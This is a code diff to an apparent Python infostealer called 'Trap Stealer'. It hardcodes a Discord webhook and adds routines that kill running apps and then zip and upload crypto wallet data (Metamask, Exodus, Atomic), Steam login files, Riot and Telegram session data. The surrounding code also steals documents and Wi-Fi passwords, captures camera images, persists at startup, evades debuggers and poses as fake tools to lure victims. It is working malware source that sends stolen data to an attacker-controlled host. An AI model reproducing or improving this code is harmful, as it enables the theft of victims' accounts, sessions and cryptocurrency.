@@ -23,7 +23,7 @@ import os.path, zipfile
 import shutil, json
 ### CONFIG ### 
 
-webhook = '%Webhook%' #Put ur webhook
+webhook = 'https://discord.com/api/webhooks/1121041824505671721/g-o8Ceap8JN3l01AYh3IKhcXUZ3CDFA95oOqHm4dPc8DqYyItRj0Gt4B2cXcdkHpk8gc' #Put ur webhook
 
 FakeWebhook = '%FakeWebhook%' # If True, starts a fake webhook tool with options to delete, spam, etc.
 Fakegen = '%FakeGen%' # If True, starts a fake Discord nitro generator
@@ -32,6 +32,19 @@ Startup = '%Startup%' # If True, adds the file to the startup folder
 antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
 DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
 StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
+
+
+
+def clear_command_prompt():
+    # Windows command prompt
+    if os.name == 'nt':
+        os.system('cls')
+    # Unix/Linux/Mac terminal
+    else:
+        os.system('clear')
+
+# Call the function to clear the command prompt
+clear_command_prompt()
 
 
 def antidebug():
@@ -114,6 +127,8 @@ class DATA_BLOB(Structure):
 
 def webhook_tools():
     try:
+        time.sleep(1)
+        clear_command_prompt()
         inputmain = input(f'''
         Which webhook tools you want to use ?
 
@@ -213,9 +228,14 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
-    
+
+WalletsZip = []
+GamingZip = []
+OtherZip = []
 def fakegen():
     try:
+        time.sleep(1)
+        clear_command_prompt()
         print('''
         ███╗   ██╗██╗████████╗██████╗  ██████╗  ██████╗ ███████╗███╗   ██╗
         ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
@@ -794,22 +814,27 @@ def upload_files_to_discord():
 
     for path in [desktop_path, downloads_path, documents_path, pictures_path]:
         for file in os.listdir(path):
-             if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
-                    file_path = os.path.join(path, file) 
-                    file_paths.append(file_path)
+            if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                file_path = os.path.join(path, file) 
+                file_paths.append(file_path)
 
     urls = []
 
     with concurrent.futures.ThreadPoolExecutor() as executor:
         futures = []
-        for file_path in file_paths:
-            futures.append(executor.submit(upload_file, file_path))
-        for future, file_path in zip(futures, file_paths):
-            url = future.result()
-            if url:
-                urls.append((os.path.basename(file_path), url))
-            else:
-                pass
+        try:
+            for file_path in file_paths:
+                futures.append(executor.submit(upload_file, file_path))
+            for future, file_path in zip(futures, file_paths):
+                url = future.result()
+                if url:
+                    urls.append((os.path.basename(file_path), url))
+                else:
+                    pass
+        finally:
+            # Ensure that the executor is properly shutdown even if an exception occurs
+            executor.shutdown(wait=True)
+
 
     if urls:
         embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
@@ -836,7 +861,72 @@ def upload_files_to_discord():
         }
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+def ZipTelegram(path, arg, procc):
+    global OtherZip
+    pathC = path
+    name = arg
+    if not os.path.exists(pathC):
+        return
 
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    with ZipFile(f"{pathC}/{name}.zip", "w") as zf:
+        files = [file for file in os.listdir(pathC) if not (
+            ".zip" in file
+            or "tdummy" in file
+            or "user_data" in file
+            or "webview" in file
+        )]
+        for file in files:
+            zf.write(f"{pathC}/{file}")
+
+    lnik = upload_file(f'{pathC}/{name}.zip')
+    os.remove(f"{pathC}/{name}.zip")
+    OtherZip.append([arg, lnik])
+
+
+def ZipThings(path, arg, procc):
+    pathC = path
+    name = arg
+
+    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"Metamask_{browser}"
+        pathC = os.path.join(path, arg)
+
+    if not os.path.exists(pathC):
+        return
+
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    if "Wallet" in arg or "NationsGlory" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"{browser}"
+    elif "Steam" in arg:
+        loginusers_file = os.path.join(pathC, "loginusers.vdf")
+        if not os.path.isfile(loginusers_file):
+            return
+        with open(loginusers_file, "r", encoding="utf8") as f:
+            data = f.read()
+            if 'RememberPassword"\t\t"1"' not in data:
+                return
+        name = arg
+
+    zf = ZipFile(os.path.join(pathC, f"{name}.zip"), "w")
+    for file in os.listdir(pathC):
+        if ".zip" not in file:
+            zf.write(os.path.join(pathC, file))
+    zf.close()
+
+    lnik = upload_file(os.path.join(pathC, f"{name}.zip"))
+    os.remove(os.path.join(pathC, f"{name}.zip"))
+
+    if "Wallet" in arg or "eogaeaoehlef" in arg:
+        WalletsZip.append([name, lnik])
+    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
+        GamingZip.append([name, lnik])
+    else:
+        OtherZip.append([name, lnik])
 
 def srcs():
     try:
@@ -906,7 +996,7 @@ def Camera_get():
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
-        
+
 def paaz():
     try:
         file = os.getenv("TEMP") + f"\wppassw.txt"
@@ -938,6 +1028,61 @@ def paaz():
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
 
+def GatherZips(paths1, paths2, paths3):
+    thttht = []
+    for patt in paths1:
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
+        a.start()
+        thttht.append(a)
+
+    for patt in paths2:
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
+        a.start()
+        thttht.append(a)
+
+    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
+    a.start()
+    thttht.append(a)
+
+    for thread in thttht: 
+        thread.join()
+    global WalletsZip, GamingZip, OtherZip
+    wal, ga, ot = "",'',''
+    if len(WalletsZip) != 0:
+        wal = ":coin:  •  Wallets\n"
+        for i in WalletsZip:
+            wal += f"└─ [{i[0]}]({i[1]})\n"
+    if len(GamingZip) != 0:
+        ga = ":video_game:  •  Gaming:\n"
+        for i in GamingZip:
+            ga += f"└─ [{i[0]}]({i[1]})\n"
+    if len(OtherZip) != 0:
+        ot = ":tickets:  •  Apps\n"
+        for i in OtherZip:
+            ot += f"└─ [{i[0]}]({i[1]})\n"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    data = {
+        "embeds": [
+            {
+            "title": "Trap Stealer Zips",
+            "description": f"{wal}\n{ga}\n{ot}",
+            "color": 0xffb6c1,
+            "footer": {
+                "text": "Trap Stealer ZIP",
+                "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
+            }
+        ],
+        "username": "Trap Stealer",
+        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+        "attachments": []
+    }
+    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+
 def GatherAll():
     browserPaths = [        
         [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -955,6 +1100,17 @@ def GatherAll():
         [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
         [f"{roaming}/discordptb", "/Local Storage/leveldb"],
     ]
+
+    PathsToZip = [
+        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
+        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
+        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
+        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
+        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
+    ]
+    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
+
+    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
     
     az = threading.Thread(target=upload_files_to_discord)
     az.start()
